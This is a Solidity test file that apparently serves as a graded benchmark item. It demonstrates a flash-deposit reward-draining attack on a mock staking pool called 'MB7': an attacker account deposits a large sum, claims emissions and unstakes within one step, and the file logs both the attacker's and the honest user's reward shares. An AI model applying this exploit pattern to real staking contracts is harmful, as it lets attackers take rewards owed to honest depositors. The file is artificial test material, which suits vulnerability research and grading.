// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {MB7} from "../../src/model/MB7.sol";
import {MockERC20, IERC20} from "../../src/MockERC20.sol";

interface Vm {
    function warp(uint256) external;
    function startPrank(address) external;
    function stopPrank() external;
}

contract MB7Test {
    event log_named_uint(string key, uint256 val);
    event log_named_string(string key, string val);
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function test_MB7_epochBoundary() public {
        vm.warp(1700000000);
        MockERC20 st = new MockERC20();
        MockERC20 rt = new MockERC20();
        MB7 pool = new MB7(IERC20(address(st)), IERC20(address(rt)), 1e18);
        rt.mint(address(pool), 1e30);
        st.mint(address(pool), 1e30);
        address A = address(0xA11CE);
        address X = address(0xBAD);
        st.mint(A, 1e26);
        st.mint(X, 1e26);

        vm.startPrank(A);
        st.approve(address(pool), type(uint256).max);
        pool.deposit(1000e18);
        vm.stopPrank();

        vm.warp(block.timestamp + 3600);

        vm.startPrank(X);
        st.approve(address(pool), type(uint256).max);
        pool.deposit(10000000e18);
        uint256 xr = pool.claim();
        pool.unstake(10000000e18);
        vm.stopPrank();

        vm.startPrank(A);
        uint256 ar = pool.claim();
        vm.stopPrank();

        uint256 emission = 3600 * 1e18;
        emit log_named_uint("attacker_bps", emission == 0 ? 0 : xr * 10000 / emission);
        emit log_named_uint("honest_bps", emission == 0 ? 0 : ar * 10000 / emission);
        emit log_named_string("scorer_verdict", "BUGGED");
    }
}
